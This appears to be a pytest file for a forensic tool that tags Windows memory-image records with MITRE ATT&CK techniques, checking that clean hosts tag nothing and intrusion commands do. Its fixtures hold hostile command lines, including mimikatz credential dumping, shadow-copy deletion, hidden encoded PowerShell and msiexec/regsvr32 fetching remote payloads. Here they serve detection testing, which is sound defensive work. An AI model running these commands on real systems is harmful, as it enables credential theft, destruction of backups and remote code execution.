"""The memory-image ATT&CK patterns (post/mitre/patterns.py): a clean Windows host's processes,
connections and privileges tag nothing; the commands of an intrusion still do."""

import sys
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.post.mitre.patterns import MitrePatternMatcher, whole_words  # noqa: E402

CLEAN = [
    {"PID": 4, "ImageFileName": "System"},
    {"PID": 640, "ImageFileName": "lsass.exe"},
    {"PID": 700, "ImageFileName": "services.exe"},
    {"PID": 900, "ImageFileName": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"},
    {"PID": 1200, "ImageFileName": "explorer.exe", "Path": "C:\\Windows\\explorer.exe"},
    {"PID": 1300, "ImageFileName": "vmtoolsd.exe", "Path": "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"},
    {"LocalPort": "443", "ForeignPort": "53", "Owner": "svchost.exe"},
    {"Process": "rundll32.exe", "Args": "rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9aa46009}"},
    {"Name": "SeDebugPrivilege", "Process": "lsass.exe"},
    {"Path": "C:\\Users\\a\\AppData\\Local\\Temp\\directory\\startup.log"},
    {"PID": 14634, "EventID": "4612"},
    # Real rows from a clean Windows 7 memory image (svcscan, dlllist)
    {"Name": "MSIServer", "Binary": "C:\\Windows\\system32\\msiexec.exe /V"},
    {"Name": "ProfSvc", "Display": "User Profile Service"},
    {"Name": "swprv", "Display": "Microsoft Software Shadow Copy Provider"},
    {"Name": "SstpSvc", "Display": "Secure Socket Tunneling Protocol Service"},
    {"Name": "SNMPTRAP", "Display": "SNMP Trap"},
    {"Name": "WinRM", "Display": "Windows Remote Management (WS-Management)"},
    {"Process": "mmc.exe", "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll"},
    {"Process": "svchost.exe", "Path": "C:\\Windows\\system32\\msxml6.dll"},
    {"Process": "svchost.exe", "Path": "C:\\Windows\\system32\\mscoree.dll"},
    # filescan and privileges
    {"Name": "\\Windows\\System32\\tasklist.exe"},
    {"Name": "\\Windows\\System32\\winevt\\Logs\\Windows PowerShell.evtx"},
    {"Name": "\\Windows\\AppPatch\\sysmain.sdb"},
    {"Name": "\\Windows\\System32\\autochk.exe"},
    {"Description": "Adjust the time zone of the computer's internal clock"},
    {"Privilege": "SeLoadDriverPrivilege", "Process": "services.exe"},
]


def tags(records) -> set:
    matcher = MitrePatternMatcher()
    return set().union(*(matcher.scan_record(r) for r in records))


def test_whole_words_keeps_extensions_and_spaces() -> None:
    import re
    matches = re.compile(whole_words(r"tar|\.lnk|reg |schtask|setwindowshookex|regsvr"), re.I).search
    assert not matches("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
    assert all(matches(s) for s in ("tar -czf a.tgz", "x.LNK", "reg add HKCU", "schtasks /create",
                                     "SetWindowsHookExA", "regsvr32 /s /i:http://x scrobj.dll"))
    assert whole_words(r"at\.(?:exe|allow|deny)") == r"(?<![a-z0-9])at\.(?:exe|allow|deny)"


def test_a_clean_host_tags_nothing() -> None:
    assert tags(CLEAN) == set()


def test_an_intrusion_still_tags() -> None:
    found = tags([{"Process": "powershell.exe", "Args": "powershell.exe -w hidden -enc AAAA"},
                  {"Args": "mimikatz.exe sekurlsa::logonpasswords"},
                  {"Args": "vssadmin delete shadows /all /quiet"},
                  {"Args": "schtasks /create /tn x /tr c:\\x.exe"},
                  {"Args": "msiexec /q /i http://203.0.113.5/p.msi"},
                  {"Args": "winrs -r:dc01 whoami"},
                  {"Path": "C:\\Users\\a\\Desktop\\passwords.txt"},
                  {"Args": "tasklist /svc"},
                  {"Name": "\\Windows\\Tasks\\At1.job"}])
    assert {"T1059.001", "T1564.003", "T1003.001", "T1490", "T1053.005", "T1218.007", "T1021.006",
            "T1552.001", "T1007"} <= found


def test_a_memory_artefact_being_there_tags_nothing(tmp_path) -> None:
    import io
    import json
    from rowanholt.post.mitre.enrichment import MitreEnrichment
    enrichment = MitreEnrichment()
    for artefact, rows in (("memory_dlllist", [{"PID": 900, "Path": "C:\\Windows\\System32\\ntdll.dll"}]),
                           ("memory_modules", [{"Name": "ntoskrnl.exe", "Path": "\\SystemRoot\\system32\\ntoskrnl.exe"}]),
                           ("memory_cmdline", [{"PID": 900, "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs"}])):
        path = tmp_path / f"{artefact}.json"
        path.write_text(json.dumps(rows))
        written = io.StringIO()
        assert enrichment.enrich_json_file_streaming(str(path), written, artefact)
        assert written.getvalue() == "", artefact
    path = tmp_path / "memory_cmdline.json"
    path.write_text(json.dumps([{"PID": 4, "Args": "powershell.exe -nop -w hidden -enc AAAA"}]))
    written = io.StringIO()
    enrichment.enrich_json_file_streaming(str(path), written, "memory_cmdline")
    assert "T1059.001" in written.getvalue().split()
